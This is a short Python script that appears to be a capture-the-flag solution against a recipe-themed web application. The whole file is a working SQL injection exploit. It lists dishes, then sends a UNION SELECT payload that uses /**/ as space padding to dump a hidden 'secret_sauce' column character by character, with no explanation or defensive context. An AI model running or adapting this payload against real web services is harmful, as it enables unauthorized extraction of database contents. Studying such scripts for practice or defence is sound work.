#!/usr/bin/env python3
import sys
import requests

if len(sys.argv) < 2:
    print("Usage: {} <url, ex: https://domain.tld:1234>".format(sys.argv[0]))
    exit(1)

s = requests.Session()
url = sys.argv[1]
max_len = 32

dishes = requests.get(url + "/dishes.php").json() 

dish = "vadsomhelst'/**/UNION/**/SELECT/**/UNICODE(SUBSTR(secret_sauce,{},1))/**/AS/**/secret_sauce_quantity/**/FROM/**/recipes/**/WHERE/**/dish='{}"

for k, v in dishes.items():
    for i in range(1, max_len):
        payload = dish.format(i, v)
        r = s.post(url + "/secret_sauce_quantity.php", json={"dish": payload})
        if r.status_code == 200:
            c = chr(r.json()["secret_sauce_quantity"])
            if c == '\x00':
                break
            elif c != " ":
                sys.stdout.write(c)
        else:
            print("err..")
            break
